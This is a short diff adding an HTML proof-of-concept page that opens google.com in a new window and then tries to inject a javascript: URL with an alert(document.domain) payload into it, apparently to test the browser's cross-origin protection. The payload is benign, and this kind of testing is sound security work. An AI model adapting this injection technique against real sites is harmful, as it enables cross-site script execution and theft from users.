@@ -1,0 +1,18 @@
+<!-- poc4_window_open_inject.html -->
+<html>
+  <body>
+    <button onclick="exploit()">⚠️ Open Google & Inject</button>
+    <script>
+      function exploit() {
+        var win = window.open("https://google.com", "_blank");
+        setTimeout(() => {
+          try {
+            win.location = "javascript:alert(document.domain)";
+          } catch (e) {
+            alert("Blocked by browser: " + e);
+          }
+        }, 2000); // enough time to load page
+      }
+    </script>
+  </body>
+</html>
